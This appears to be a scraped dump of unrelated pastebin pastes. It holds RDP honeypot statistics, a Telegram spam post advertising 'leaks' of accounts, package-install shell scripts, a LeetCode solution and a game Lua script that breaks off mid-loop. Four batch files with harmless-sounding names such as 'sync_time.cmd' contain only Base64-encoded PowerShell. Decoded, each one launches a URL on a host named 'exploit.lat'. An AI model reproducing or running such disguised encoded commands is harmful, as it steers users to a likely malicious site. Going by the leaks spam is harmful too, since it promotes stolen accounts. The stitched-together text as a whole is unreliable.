id,title,username,language,date,content
TykUkKrJ,2025-06-07_stats.json,rdp_snitch,JSON,Saturday 7th of June 2025 07:18:29 PM CDT,"{
  ""ip"": {
    ""167.172.131.118"": 8514,
    ""143.198.221.164"": 456,
    ""103.56.5.14"": 267,
    ""62.3.42.167"": 6,
    ""45.227.254.130"": 9,
    ""91.238.181.91"": 6,
    ""147.185.132.158"": 12,
    ""45.227.254.152"": 6,
    ""80.94.95.203"": 9,
    ""205.210.31.200"": 9,
    ""47.120.47.93"": 3,
    ""193.142.146.227"": 9,
    ""92.63.197.23"": 9,
    ""129.227.230.73"": 3,
    ""172.184.144.136"": 6,
    ""91.202.233.4"": 12,
    ""198.235.24.236"": 9,
    ""152.42.212.148"": 7077,
    ""104.236.244.191"": 9,
    ""165.232.170.129"": 41703,
    ""128.199.168.88"": 4998,
    ""198.235.24.233"": 9,
    ""88.214.25.121"": 6,
    ""91.238.181.94"": 6,
    ""167.99.236.65"": 15,
    ""147.185.132.61"": 9,
    ""47.236.157.151"": 3
  },
  ""asn"": {
    ""AS14061"": 62772,
    ""AS140599"": 267,
    ""AS61173"": 6,
    ""AS267784"": 15,
    ""AS49434"": 12,
    ""AS396982"": 48,
    ""AS204428"": 9,
    ""AS37963"": 3,
    ""AS213438"": 9,
    ""AS210848"": 9,
    ""AS21859"": 3,
    ""AS8075"": 6,
    ""AS200593"": 12,
    ""AS35042"": 6,
    ""AS45102"": 3
  },
  ""isp"": {
    ""DigitalOcean, LLC"": 62772,
    ""Comfac Corporation"": 267,
    ""Green Web Samaneh Novin PJSC"": 6,
    ""Flyservers S.A."": 15,
    ""Datacenter location PAR1 France"": 12,
    ""Google LLC"": 48,
    ""SS-Net"": 9,
    ""Hangzhou Alibaba Advertising Co., Ltd."": 3,
    ""ColocaTel Inc."": 9,
    ""Telkom Internet LTD"": 9,
    ""Zenlayer Inc"": 3,
    ""Microsoft"": 6,
    ""Prospero OOO"": 12,
    ""NOC EMAIL: noc@one-host.net"": 6,
    ""Alibaba (US) Technology Co., Ltd."": 3
  },
  ""org"": {
    ""DigitalOcean, LLC"": 62757,
    ""Comfac Corporation"": 267,
    ""Green Web Samaneh Novin PJSC"": 6,
    ""Xwin Universal LTD"": 15,
    ""ThinkTech Technology Industrial CO. Limited"": 18,
    ""Palo Alto Networks, Inc"": 48,
    ""Unmanaged LTD"": 9,
    ""Alibaba.com LLC"": 6,
    ""ColocaTel Inc"": 9,
    ""Korotkij Denis Aleksandrovich"": 9,
    ""NetProtect LLC"": 3,
    ""Microsoft Azure Cloud (westus)"": 6,
    ""Prospero OOO"": 12,
    ""Digital Ocean"": 15
  },
  ""regionName"": {
    ""New Jersey"": 8538,
    ""South West"": 54234,
    ""Metro Manila"": 267,
    ""Razavi Khorasan"": 6,
    ""Vilnius"": 15,
    ""\u00cele-de-France"": 12,
    ""California"": 54,
    ""Budapest"": 9,
    ""Guangdong"": 3,
    ""North Holland"": 18,
    ""Bangkok"": 3,
    ""Ashgabat"": 12,
    ""Kowloon City"": 6,
    ""North West"": 3
  },
  ""country"": {
    ""United States"": 8592,
    ""Singapore"": 54237,
    ""Philippines"": 267,
    ""Iran"": 6,
    ""Lithuania"": 15,
    ""France"": 12,
    ""Hungary"": 9,
    ""China"": 3,
    ""The Netherlands"": 18,
    ""Thailand"": 3,
    ""Turkmenistan"": 12,
    ""Hong Kong"": 6
  },
  ""account"": {
    ""hello"": 63057,
    ""Domain"": 18,
    ""Test"": 27,
    ""yhDxyQONx"": 6,
    ""nmap"": 3,
    ""naap"": 3,
    ""Administr"": 30,
    ""dRMIARzYe"": 3,
    ""ZzDQaL"": 3,
    ""TYPoLW"": 3,
    ""PVSCsdRvF"": 3,
    ""wVhDlN"": 3,
    ""SoFYtc"": 3,
    ""dFAyiNgDf"": 3,
    ""NRWHgv"": 3,
    ""hxudXJ"": 3,
    ""HgZvDBanI"": 3,
    ""TGZddU"": 3,
    ""VKzioF"": 3
  },
  ""keyboard"": {
    ""Unknown"": 63180
  },
  ""client_build"": {
    ""Unknown"": 63180
  },
  ""client_name"": {
    ""Unknown"": 63180
  },
  ""ip_type"": {
    ""hosting"": 62850,
    ""Unknown"": 327,
    ""mobile & hosting & proxy"": 3
  }
}"
zNDPvDcp,âœ… Free Cash Leaks AW,mraimbot,JavaScript,Saturday 7th of June 2025 07:17:40 PM CDT,"
We just posted fresh leaks.
 
Join the channel: https://t.me/LucasLEAK
 
Accounts: #VSs0j4wSzn

"
tejE7yDu,2025-06-07_stats.json,rdp_snitch,JSON,Saturday 7th of June 2025 07:16:11 PM CDT,"{
  ""ip"": {
    ""167.172.131.118"": 5676,
    ""143.198.221.164"": 304,
    ""103.56.5.14"": 178,
    ""62.3.42.167"": 4,
    ""45.227.254.130"": 6,
    ""91.238.181.91"": 4,
    ""147.185.132.158"": 8,
    ""45.227.254.152"": 4,
    ""80.94.95.203"": 6,
    ""205.210.31.200"": 6,
    ""47.120.47.93"": 2,
    ""193.142.146.227"": 6,
    ""92.63.197.23"": 6,
    ""129.227.230.73"": 2,
    ""172.184.144.136"": 4,
    ""91.202.233.4"": 8,
    ""198.235.24.236"": 6,
    ""152.42.212.148"": 4718,
    ""104.236.244.191"": 6,
    ""165.232.170.129"": 27802,
    ""128.199.168.88"": 3332,
    ""198.235.24.233"": 6,
    ""88.214.25.121"": 4,
    ""91.238.181.94"": 4,
    ""167.99.236.65"": 10,
    ""147.185.132.61"": 6,
    ""47.236.157.151"": 2
  },
  ""asn"": {
    ""AS14061"": 41848,
    ""AS140599"": 178,
    ""AS61173"": 4,
    ""AS267784"": 10,
    ""AS49434"": 8,
    ""AS396982"": 32,
    ""AS204428"": 6,
    ""AS37963"": 2,
    ""AS213438"": 6,
    ""AS210848"": 6,
    ""AS21859"": 2,
    ""AS8075"": 4,
    ""AS200593"": 8,
    ""AS35042"": 4,
    ""AS45102"": 2
  },
  ""isp"": {
    ""DigitalOcean, LLC"": 41848,
    ""Comfac Corporation"": 178,
    ""Green Web Samaneh Novin PJSC"": 4,
    ""Flyservers S.A."": 10,
    ""Datacenter location PAR1 France"": 8,
    ""Google LLC"": 32,
    ""SS-Net"": 6,
    ""Hangzhou Alibaba Advertising Co., Ltd."": 2,
    ""ColocaTel Inc."": 6,
    ""Telkom Internet LTD"": 6,
    ""Zenlayer Inc"": 2,
    ""Microsoft"": 4,
    ""Prospero OOO"": 8,
    ""NOC EMAIL: noc@one-host.net"": 4,
    ""Alibaba (US) Technology Co., Ltd."": 2
  },
  ""org"": {
    ""DigitalOcean, LLC"": 41838,
    ""Comfac Corporation"": 178,
    ""Green Web Samaneh Novin PJSC"": 4,
    ""Xwin Universal LTD"": 10,
    ""ThinkTech Technology Industrial CO. Limited"": 12,
    ""Palo Alto Networks, Inc"": 32,
    ""Unmanaged LTD"": 6,
    ""Alibaba.com LLC"": 4,
    ""ColocaTel Inc"": 6,
    ""Korotkij Denis Aleksandrovich"": 6,
    ""NetProtect LLC"": 2,
    ""Microsoft Azure Cloud (westus)"": 4,
    ""Prospero OOO"": 8,
    ""Digital Ocean"": 10
  },
  ""regionName"": {
    ""New Jersey"": 5692,
    ""South West"": 36156,
    ""Metro Manila"": 178,
    ""Razavi Khorasan"": 4,
    ""Vilnius"": 10,
    ""\u00cele-de-France"": 8,
    ""California"": 36,
    ""Budapest"": 6,
    ""Guangdong"": 2,
    ""North Holland"": 12,
    ""Bangkok"": 2,
    ""Ashgabat"": 8,
    ""Kowloon City"": 4,
    ""North West"": 2
  },
  ""country"": {
    ""United States"": 5728,
    ""Singapore"": 36158,
    ""Philippines"": 178,
    ""Iran"": 4,
    ""Lithuania"": 10,
    ""France"": 8,
    ""Hungary"": 6,
    ""China"": 2,
    ""The Netherlands"": 12,
    ""Thailand"": 2,
    ""Turkmenistan"": 8,
    ""Hong Kong"": 4
  },
  ""account"": {
    ""hello"": 42038,
    ""Domain"": 12,
    ""Test"": 18,
    ""yhDxyQONx"": 4,
    ""nmap"": 2,
    ""naap"": 2,
    ""Administr"": 20,
    ""dRMIARzYe"": 2,
    ""ZzDQaL"": 2,
    ""TYPoLW"": 2,
    ""PVSCsdRvF"": 2,
    ""wVhDlN"": 2,
    ""SoFYtc"": 2,
    ""dFAyiNgDf"": 2,
    ""NRWHgv"": 2,
    ""hxudXJ"": 2,
    ""HgZvDBanI"": 2,
    ""TGZddU"": 2,
    ""VKzioF"": 2
  },
  ""keyboard"": {
    ""Unknown"": 42120
  },
  ""client_build"": {
    ""Unknown"": 42120
  },
  ""client_name"": {
    ""Unknown"": 42120
  },
  ""ip_type"": {
    ""hosting"": 41900,
    ""Unknown"": 218,
    ""mobile & hosting & proxy"": 2
  }
}"
QiyZp6PK,2025-06-07_stats.json,rdp_snitch,JSON,Saturday 7th of June 2025 07:15:12 PM CDT,"{
  ""ip"": {
    ""167.172.131.118"": 2838,
    ""143.198.221.164"": 152,
    ""103.56.5.14"": 89,
    ""62.3.42.167"": 2,
    ""45.227.254.130"": 3,
    ""91.238.181.91"": 2,
    ""147.185.132.158"": 4,
    ""45.227.254.152"": 2,
    ""80.94.95.203"": 3,
    ""205.210.31.200"": 3,
    ""47.120.47.93"": 1,
    ""193.142.146.227"": 3,
    ""92.63.197.23"": 3,
    ""129.227.230.73"": 1,
    ""172.184.144.136"": 2,
    ""91.202.233.4"": 4,
    ""198.235.24.236"": 3,
    ""152.42.212.148"": 2359,
    ""104.236.244.191"": 3,
    ""165.232.170.129"": 13901,
    ""128.199.168.88"": 1666,
    ""198.235.24.233"": 3,
    ""88.214.25.121"": 2,
    ""91.238.181.94"": 2,
    ""167.99.236.65"": 5,
    ""147.185.132.61"": 3,
    ""47.236.157.151"": 1
  },
  ""asn"": {
    ""AS14061"": 20924,
    ""AS140599"": 89,
    ""AS61173"": 2,
    ""AS267784"": 5,
    ""AS49434"": 4,
    ""AS396982"": 16,
    ""AS204428"": 3,
    ""AS37963"": 1,
    ""AS213438"": 3,
    ""AS210848"": 3,
    ""AS21859"": 1,
    ""AS8075"": 2,
    ""AS200593"": 4,
    ""AS35042"": 2,
    ""AS45102"": 1
  },
  ""isp"": {
    ""DigitalOcean, LLC"": 20924,
    ""Comfac Corporation"": 89,
    ""Green Web Samaneh Novin PJSC"": 2,
    ""Flyservers S.A."": 5,
    ""Datacenter location PAR1 France"": 4,
    ""Google LLC"": 16,
    ""SS-Net"": 3,
    ""Hangzhou Alibaba Advertising Co., Ltd."": 1,
    ""ColocaTel Inc."": 3,
    ""Telkom Internet LTD"": 3,
    ""Zenlayer Inc"": 1,
    ""Microsoft"": 2,
    ""Prospero OOO"": 4,
    ""NOC EMAIL: noc@one-host.net"": 2,
    ""Alibaba (US) Technology Co., Ltd."": 1
  },
  ""org"": {
    ""DigitalOcean, LLC"": 20919,
    ""Comfac Corporation"": 89,
    ""Green Web Samaneh Novin PJSC"": 2,
    ""Xwin Universal LTD"": 5,
    ""ThinkTech Technology Industrial CO. Limited"": 6,
    ""Palo Alto Networks, Inc"": 16,
    ""Unmanaged LTD"": 3,
    ""Alibaba.com LLC"": 2,
    ""ColocaTel Inc"": 3,
    ""Korotkij Denis Aleksandrovich"": 3,
    ""NetProtect LLC"": 1,
    ""Microsoft Azure Cloud (westus)"": 2,
    ""Prospero OOO"": 4,
    ""Digital Ocean"": 5
  },
  ""regionName"": {
    ""New Jersey"": 2846,
    ""South West"": 18078,
    ""Metro Manila"": 89,
    ""Razavi Khorasan"": 2,
    ""Vilnius"": 5,
    ""\u00cele-de-France"": 4,
    ""California"": 18,
    ""Budapest"": 3,
    ""Guangdong"": 1,
    ""North Holland"": 6,
    ""Bangkok"": 1,
    ""Ashgabat"": 4,
    ""Kowloon City"": 2,
    ""North West"": 1
  },
  ""country"": {
    ""United States"": 2864,
    ""Singapore"": 18079,
    ""Philippines"": 89,
    ""Iran"": 2,
    ""Lithuania"": 5,
    ""France"": 4,
    ""Hungary"": 3,
    ""China"": 1,
    ""The Netherlands"": 6,
    ""Thailand"": 1,
    ""Turkmenistan"": 4,
    ""Hong Kong"": 2
  },
  ""account"": {
    ""hello"": 21019,
    ""Domain"": 6,
    ""Test"": 9,
    ""yhDxyQONx"": 2,
    ""nmap"": 1,
    ""naap"": 1,
    ""Administr"": 10,
    ""dRMIARzYe"": 1,
    ""ZzDQaL"": 1,
    ""TYPoLW"": 1,
    ""PVSCsdRvF"": 1,
    ""wVhDlN"": 1,
    ""SoFYtc"": 1,
    ""dFAyiNgDf"": 1,
    ""NRWHgv"": 1,
    ""hxudXJ"": 1,
    ""HgZvDBanI"": 1,
    ""TGZddU"": 1,
    ""VKzioF"": 1
  },
  ""keyboard"": {
    ""Unknown"": 21060
  },
  ""client_build"": {
    ""Unknown"": 21060
  },
  ""client_name"": {
    ""Unknown"": 21060
  },
  ""ip_type"": {
    ""hosting"": 20950,
    ""Unknown"": 109,
    ""mobile & hosting & proxy"": 1
  }
}"
XEFdaVwN,install p7zip,jcofer555,Bash,Saturday 7th of June 2025 06:28:24 PM CDT,"#!/bin/bash

# Ensure extra folder on flash drive exists
echo ""Checking if extra exists on the flash drive""
if [ -d ""/boot/extra"" ]; then
    echo ""Extra folder already exists on the flash drive""
else
    echo ""Extra folder does not exist, Attempting to create it on the flash drive""
    if mkdir -p ""/boot/extra""; then
        echo ""Successfully created the extra folder on the flash drive""
    else
        echo ""Failed to create the extra folder on the flash drive""
        exit 1
    fi
fi

# Function to download a package if it doesn't already exist
download_package() {
    local pkg_name=$1
    local pkg_url=$2
    local pkg_path=""/boot/extra/$pkg_name""

    if [ -f ""$pkg_path"" ]; then
        echo ""Package $pkg_name already exists in /boot/extra/, skipping download""
    else
        echo ""Downloading $pkg_name...""
        if wget -q -O ""$pkg_path"" ""$pkg_url""; then
            echo ""Successfully downloaded $pkg_name to the flash drive extra folder""
        else
            echo ""Failed to download $pkg_name from $pkg_url""
            return 1
        fi
    fi
}

# Function to install a package after verifying it exists
install_package() {
    local pkg_name=$1
    local pkg_url=$2
    local pkg_path=""/boot/extra/$pkg_name""
    local check_cmd=$3

    # Ensure the package exists before checking installation status
    if [ -f ""$pkg_path"" ]; then
        echo ""Package $pkg_name already exists in /boot/extra/""
    else
        echo ""Package $pkg_name not found in /boot/extra/, attempting to download""
        if ! download_package ""$pkg_name"" ""$pkg_url""; then
            echo ""Failed to retrieve $pkg_name, aborting installation.""
            return 1
        fi
    fi

    # Check if package is already installed before proceeding
    if eval ""$check_cmd""; then
        echo ""$pkg_name is already installed, skipping installation""
        return 0
    fi

    # Attempt installation
    echo ""Installing $pkg_name...""
    if installpkg ""$pkg_path"" >/dev/null 2>&1; then
        echo ""$pkg_name has been successfully installed!""
    else
        echo ""Failed to install $pkg_name""
        return 1
    fi
}

# Define package variables
pkg_name=""p7zip-17.05-x86_64-3cf.txz""
pkg_url=""https://slackers.it/repository/slackware64-current/p7zip/$pkg_name""
pkg_path=""/boot/extra/$pkg_name""
pkg_check=""command -v 7z >/dev/null 2>&1""

# Install p7zip if missing
install_package ""$pkg_name"" ""$pkg_url"" ""$pkg_check"""
ywsZmFLH,install jdupes,jcofer555,Bash,Saturday 7th of June 2025 06:27:28 PM CDT,"#!/bin/bash

# Ensure extra folder on flash drive exists
echo ""Checking if extra exists on the flash drive""
if [ -d ""/boot/extra"" ]; then
    echo ""Extra folder already exists on the flash drive""
else
    echo ""Extra folder does not exist, Attempting to create it on the flash drive""
    if mkdir -p ""/boot/extra""; then
        echo ""Successfully created the extra folder on the flash drive""
    else
        echo ""Failed to create the extra folder on the flash drive""
        exit 1
    fi
fi

# Function to download a package if it doesn't already exist
download_package() {
    local pkg_name=$1
    local pkg_url=$2
    local pkg_path=""/boot/extra/$pkg_name""

    if [ -f ""$pkg_path"" ]; then
        echo ""Package $pkg_name already exists in /boot/extra/, skipping download""
    else
        echo ""Downloading $pkg_name""
        if wget -q -O ""$pkg_path"" ""$pkg_url""; then
            echo ""Successfully downloaded $pkg_name to the flash drive extra folder""
        else
            echo ""Failed to download $pkg_name from $pkg_url""
            return 1
        fi
    fi
}

# Function to install a package after verifying it exists and format is correct
install_package() {
    local pkg_name=$1
    local pkg_url=$2
    local pkg_path=""/boot/extra/$pkg_name""
    local check_cmd=$3

    # Ensure the package exists before checking installation status
    if [ -f ""$pkg_path"" ]; then
        echo ""Package $pkg_name already exists in /boot/extra""
    else
        echo ""Package $pkg_name not found in /boot/extra/, attempting to download""
        if ! download_package ""$pkg_name"" ""$pkg_url""; then
            echo ""Failed to retrieve $pkg_name, aborting installation""
            return 1
        fi
    fi

    # Check if the file is empty. If empty delete it and redownload
    if [ ! -s ""$pkg_path"" ]; then
        echo ""Error: $pkg_name exists but is empty. Deleting and redownloading""
        rm -f ""$pkg_path""
        if ! download_package ""$pkg_name"" ""$pkg_url""; then
            echo ""Failed to re-download $pkg_name, aborting installation""
            return 1
        fi
    else
        echo ""Package $pkg_name is valid""
    fi

    # Verify the package format. If incorrect format delete it and redownload
    if file ""$pkg_path"" | grep -q 'XZ compressed data\|gzip compressed data'; then
        echo ""Package $pkg_name format is correct.""
    else
        echo ""Error: $pkg_name does not appear to be a valid Slackware package. Deleting and redownloading""
        rm -f ""$pkg_path""
        if ! download_package ""$pkg_name"" ""$pkg_url""; then
            echo ""Failed to re-download $pkg_name, aborting installation""
            return 1
        fi
    fi

    # Check if package is already installed before proceeding
    if eval ""$check_cmd""; then
        echo ""$pkg_name is already installed, skipping installation""
        return 0
    fi

    # Attempt installation
    echo ""Installing $pkg_name...""
    if installpkg ""$pkg_path"" >/dev/null 2>&1; then
        echo ""$pkg_name has been successfully installed""
    else
        echo ""Failed to install $pkg_name""
        return 1
    fi
}

# Define package variables
libjody_pkg=""libjodycode-3.1.1-x86_64-2_SBo.tgz""
libjody_url=""https://github.com/shinji257/unraid_pkgs/raw/refs/heads/main/slackware64-current/libjodycode/libjodycode-3.1.1-x86_64-2_SBo.tgz""
libjody_check=""ldconfig -p | grep -q libjodycode.so.3""

jdupes_pkg=""jdupes-1.28.0-x86_64-2_SBo.tgz""
jdupes_url=""https://raw.githubusercontent.com/shinji257/unraid_pkgs/refs/heads/main/slackware64-current/jdupes/jdupes-1.28.0-x86_64-2_SBo.tgz""
jdupes_check=""which jdupes >/dev/null 2>&1""

# Install libjodycode if missing
install_package ""$libjody_pkg"" ""$libjody_url"" ""$libjody_check""

# Install jdupes if missing
install_package ""$jdupes_pkg"" ""$jdupes_url"" ""$jdupes_check"""
M4SML2ud,enable_feature.bat,neolino,Batch,Saturday 7th of June 2025 06:05:43 PM CDT,"powershell -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACIAaAB0AHQAcABzADoALwAvAGUAeABwAGwAbwBpAHQALgBsAGEAdAAiACAAIAAjACAAaQBkAD0AYwA5ADQAZAAyAGUAZQBiAA==

qa6OlB"
DCxjjkj7,terminate_process.cmd,johsn2010,Batch,Saturday 7th of June 2025 06:05:40 PM CDT,"powershell -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACIAaAB0AHQAcABzADoALwAvAGUAeABwAGwAbwBpAHQALgBsAGEAdAAiACAAIAAjACAAaQBkAD0AMgA3AGEANAA5AGQAYwA2AA==

VjSPJc"
tRefnh1A,LeetCode 46. Permutations,AmbushedRaccoon,C++,Saturday 7th of June 2025 05:59:31 PM CDT,"class Solution46 {
public:
    std::vector<std::vector<int>> permute(std::vector<int> nums)
    {
        std::vector<std::vector<int>> result;
        
        std::sort(nums.begin(), nums.end());
        int swapIndex;
        do
        {
            swapIndex = -1;
            result.push_back(nums);
            for (int i = nums.size() - 2; i >= 0; --i)
            {
                if (nums[i] < nums[i + 1])
                {
                    swapIndex = i;
                    break;
                }
            }
            if (swapIndex != -1)
            {
                for (int i = nums.size() - 1; i >= 0; --i)
                {
                    if (nums[i] > nums[swapIndex])
                    {
                        std::swap(nums[i], nums[swapIndex]);
                        break;
                    }
                }
                std::reverse(nums.begin() + swapIndex + 1, nums.end());
            }
        } while (swapIndex != -1);
        return result;
    }
};"
iFyd5L6w,sync_time.cmd,neolino,Batch,Saturday 7th of June 2025 05:55:42 PM CDT,"powershell -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACIAaAB0AHQAcABzADoALwAvAGUAeABwAGwAbwBpAHQALgBsAGEAdAAiACAAIAAjACAAaQBkAD0AZgBhAGUANQAwADgAOQA4AA==

iPkoTx"
p2kCUHqD,compile_code.ps1,johsn2010,Batch,Saturday 7th of June 2025 05:55:39 PM CDT,"powershell -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACIAaAB0AHQAcABzADoALwAvAGUAeABwAGwAbwBpAHQALgBsAGEAdAAiACAAIAAjACAAaQBkAD0AYQA3AGYAOQA5ADcAMQBlAA==

Gd1jsP"
yw2bPSUA,solar_remote_monitor,DanFrmSpace,Lua,Saturday 7th of June 2025 05:48:10 PM CDT,"-- Remote Energy Farm Monitor Script
-- Receives wireless data and displays on monitor

local WIRELESS_CHANNEL = 100
local MONITOR_SIDE = ""top"" -- Change this to match your monitor position
local REFRESH_TIMEOUT = 30 -- seconds before showing ""no data"" warning

-- Initialize peripherals
local wirelessModem = peripheral.find(""modem"", function(name, modem)
    return modem.isWireless()
end)

if not wirelessModem then
    error(""No wireless modem found"")
end

print(""Found wireless modem: "" .. peripheral.getName(wirelessModem))

local monitor = peripheral.wrap(MONITOR_SIDE)
if not monitor then
    error(""No monitor found on "" .. MONITOR_SIDE)
end

-- Open wireless channel
wirelessModem.open(WIRELESS_CHANNEL)
print(""Opened wireless channel "" .. WIRELESS_CHANNEL)

-- Monitor setup
monitor.setTextScale(0.5)
local monitorWidth, monitorHeight = monitor.getSize()

-- Color definitions
local colorScheme = {
    background = colors.black,
    header = colors.yellow,
    good = colors.green,
    warning = colors.orange,
    critical = colors.red,
    info = colors.white,
    accent = colors.cyan
}

-- Data storage
local lastData = nil
local lastUpdateTime = 0

-- Function to format energy values
local function formatEnergy(energy)
    if energy >= 1000000000 then
        return string.format(""%.2fGFE"", energy / 1000000000)
    elseif energy >= 1000000 then
        return string.format(""%.2fMFE"", energy / 1000000)
    elseif energy >= 1000 then
        return string.format(""%.2fkFE"", energy / 1000)
    else
        return string.format(""%.0fFE"", energy)
    end
end

-- Function to get color based on percentage
local function getPercentageColor(percentage)
    if percentage >= 80 then
        return colorScheme.good
    elseif percentage >= 50 then
        return colorScheme.warning
    else
        return colorScheme.critical
    end
end

-- Function to draw a progress bar
local function drawProgressBar(x, y, width, percentage, label)
    local fillWidth = math.floor((percentage / 100) * width)
    
    monitor.setCursorPos(x, y)
    monitor.setTextColor(colorScheme.info)
    monitor.write(label .. "":"")
    
    monitor.setCursorPos(x, y + 1)
    monitor.setBackgroundColor(colors.gray)
    monitor.write(string.rep("" "", width))
    
    monitor.setCursorPos(x, y + 1)
    monitor.setBackgroundColor(getPercentageColor(percentage))
    monitor.write(string.rep("" "", fillWidth))
    
    monitor.setCursorPos(x + width + 1, y + 1)
    monitor.setBackgroundColor(colorScheme.background)
    monitor.setTextColor(colorScheme.info)
    monitor.write(string.format("" %.1f%%"", percentage))
end

-- Function to draw header
local function drawHeader()
    monitor.setBackgroundColor(colorScheme.background)
    monitor.clear()
    
    monitor.setCursorPos(1, 1)
    monitor.setTextColor(colorScheme.header)
    monitor.setBackgroundColor(colorScheme.background)
    
    local title = ""ENERGY FARM MONITORING SYSTEM""
    local centerX = math.floor((monitorWidth - string.len(title)) / 2) + 1
    monitor.setCursorPos(centerX, 1)
    monitor.write(title)
    
    monitor.setCursorPos(1, 2)
    monitor.setTextColor(colorScheme.accent)
    monitor.write(string.rep(""="", monitorWidth))
end

-- Function to draw connection status
local function drawConnectionStatus()
    local currentTime = os.epoch(""utc"") / 1000
    local timeSinceUpdate = currentTime - lastUpdateTime
    
    monitor.setCursorPos(1, 3)
    monitor.setTextColor(colorScheme.info)
    monitor.write(""Status: "")
    
    if timeSinceUpdate > REFRESH_TIMEOUT then
        monitor.setTextColor(colorScheme.critical)
        monitor.write(""NO DATA - Connection Lost"")
    elseif timeSinceUpdate > 10 then
        monitor.setTextColor(colorScheme.warning)
        monitor.write(""Delayed - "" .. math.floor(timeSinceUpdate) .. ""s ago"")
    else
        monitor.setTextColor(colorScheme.good)
        monitor.write(""Connected - Live Data"")
    end
    
    monitor.setCursorPos(monitorWidth - 19, 3)
    monitor.setTextColor(colorScheme.info)
    monitor.write(""Time: "" .. textutils.formatTime(os.time(), true))
end

-- Function to draw solar panel section
local function drawSolarSection(stats, startY)
    monitor.setCursorPos(1, startY)
    monitor.setTextColor(colorScheme.header)
    monitor.write(""SOLAR PANELS"")
    
    local y = startY + 1
    monitor.setCursorPos(1, y)
    monitor.setTextColor(colorScheme.info)
    monitor.write(""Energy: "" .. formatEnergy(stats.solar.totalEnergy) .. "" / "" .. formatEnergy(stats.solar.totalMaxEnergy))
    
    y = y + 1
    monitor.setCursorPos(1, y)
    monitor.write(""Production: "" .. formatEnergy(stats.solar.totalProductionRate) .. ""/t"")
    
    y = y + 1
    monitor.setCursorPos(1, y)
    monitor.setTextColor(stats.solar.panelsSeeSun == stats.solar.totalPanels and colorScheme.good or colorScheme.warning)
    monitor.write(""Sun Visibility: "" .. stats.solar.panelsSeeSun .. ""/"" .. stats.solar.totalPanels .. "" panels"")
    
    y = y + 2
    drawProgressBar(1, y, 30, stats.solar.averagePercentage, ""Solar Fill Level"")
    
    return y + 3
end

-- Function to draw energy cube section
local function drawCubeSection(stats, startY)
    monitor.setCursorPos(1, startY)
    monitor.setTextColor(colorScheme.header)
    monitor.write(""ENERGY STORAGE"")
    
    local y = startY + 1
    monitor.setCursorPos(1, y)
    monitor.setTextColor(colorScheme.info)
    monitor.write(""Energy: "" .. formatEnergy(stats.cubes.totalEnergy) .. "" / "" .. formatEnergy(stats.cubes.totalMaxEnergy))
    
    y = y + 1
    monitor.setCursorPos(1, y)
    monitor.setTextColor(stats.cubes.ejectingCubes > 0 and colorScheme.good or colorScheme.warning)
    monitor.write(""Ejecting: "" .. stats.cubes.ejectingCubes .. ""/"" .. stats.cubes.totalCubes .. "" cubes"")
    
    y = y + 2
    drawProgressBar(1, y, 30, stats.cubes.averagePercentage, ""Storage Fill Level"")
    
    return y + 3
end

-- Function to draw system overview
local function drawSystemOverview(stats, startY)
    monitor.setCursorPos(1, startY)
    monitor.setTextColor(colorScheme.header)
    monitor.write(""SYSTEM OVERVIEW"")
    
    local y = startY + 1
    monitor.setCursorPos(1, y)
    monitor.setTextColor(colorScheme.info)
    monitor.write(""Total Energy: "" .. formatEnergy(stats.system.totalSystemEnergy))
    
    y = y + 1
    monitor.setCursorPos(1, y)
    monitor.write(""Total Capacity: "" .. formatEnergy(stats.system.totalSystemCapacity))
    
    y = y + 2
    drawProgressBar(1, y, 40, stats.system.systemPercentage, ""System Fill Level"")
    
    return y + 3
end

-- Function to draw individual device details
local function drawDeviceDetails(data, startY)
    if startY >= monitorHeight - 2 then
        return startY
    end
    
    monitor.setCursorPos(1, startY)
    monitor.setTextColor(colorScheme.header)
    monitor.write(""DEVICE STATUS"")
    
    local y = startY + 1
    local col1 = 1
    local col2 = math.floor(monitorWidth / 2) + 1
    
    -- Solar panels column
    monitor.setCursorPos(col1, y)
    monitor.setTextColor(colorScheme.accent)
    monitor.write(""Solar Panels:"")
    y = y + 1
    
    local solarCount = 0
    for name, panelData in pairs(data.solar) do
        if y >= monitorHeight then break end
        solarCount = solarCount + 1
        if solarCount <= 5 then -- Show first 5 panels
            monitor.setCursorPos(col1, y)
            monitor.setTextColor(panelData.canSeeSun and colorScheme.good or colorScheme.warning)
            local shortName = string.gsub(name, ""advancedSolarGenerator_"", ""S"")
            monitor.write(shortName .. "": "" .. string.format(""%.0f%%"", panelData.energyPercentage))
            y = y + 1
        end
    end
    
    -- Energy cubes column
    y = startY + 1
    monitor.setCursorPos(col2, y)
    monitor.setTextColor(colorScheme.accent)
    monitor.write(""Energy Cubes:"")
    y = y + 1
    
    local cubeCount = 0
    for name, cubeData in pairs(data.cubes) do
        if y >= monitorHeight then break end
        cubeCount = cubeCount + 1
        if cubeCount <= 5 then -- Show first 5 cubes
            monitor.setCursorPos(col2, y)
            monitor.setTextColor(cubeData.isEjecting and colorScheme.good or colorScheme.info)
            local shortName = string.gsub(name, ""advancedEnergyCube_"", ""C"")
            monitor.write(shortName .. "": "" .. string.format(""%.0f%%"", cubeData.energyPercentage))
            y = y + 1
        end
    end
    
    return math.max(startY + 7, y)
end

-- Function to update display
local function updateDisplay()
    if not lastData then
        drawHeader()
        drawConnectionStatus()
        monitor.setCursorPos(1, 5)
        monitor.setTextColor(colorScheme.warning)
        monitor.write(""Waiting for data from energy farm..."")
        return
    end
    
    drawHeader()
    drawConnectionStatus()
    
    local y = 5
    y = drawSolarSection(lastData.stats, y)
    y = drawCubeSection(lastData.stats, y)
    y = drawSystemOverview(lastData.stats, y)
    
    if y < monitorHeight - 5 then
        drawDeviceDetails(lastData, y)
    end
end

-- Function to handle incoming messages
local function handleMessage(message)
    print(""Received message: "" .. textutils.serialize(message))
    if type(message) == ""table"" and message.data and message.source == ""computer_1"" then
        lastData = message.data
        lastUpdateTime = os.epoch(""utc"") / 1000
        updateDisplay()
        print(""Data updated successfully"")
    else
        print(""Message format invalid or wrong source"")
    end
end

-- Main program loop
local function main()
    print(""Starting Remote Energy Monitor..."")
    print(""Listening on channel: "" .. WIRELESS_CHANNEL)
    print(""Monitor size: "" .. monitorWidth .. ""x"" .. monitorHeight)
    
    -- Initial display
    updateDisplay()
    
    while true do
        local event, side, channel, replyChannel, message, distance = os.pullEvent()
        
        if event == ""modem_message"" then
